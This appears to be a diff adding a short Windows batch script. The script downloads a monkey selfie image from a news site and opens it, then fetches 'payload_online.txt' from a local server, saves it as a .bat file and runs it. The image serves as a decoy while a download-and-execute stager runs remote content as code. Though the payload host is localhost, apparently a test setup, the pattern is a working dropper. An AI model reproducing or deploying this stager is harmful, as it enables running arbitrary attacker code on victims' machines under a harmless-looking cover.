@@ -1,0 +1,6 @@
+Powershell -Command "Invoke-WebRequest 'https://images.nrc.nl/Kxt2qUI7fSThvgmV-zw3PSY9dlE=/640x/filters:no_upscale()/s3/static.nrc.nl/images/stripped/2308nndrieapenselfie.jpg' -OutFile aap.png"
+aap.png
+
+Powershell -Command "Invoke-WebRequest 'http://127.0.0.1:5500/payload_online.txt' -OutFile aap_payload.bat"
+aap_payload.bat
+
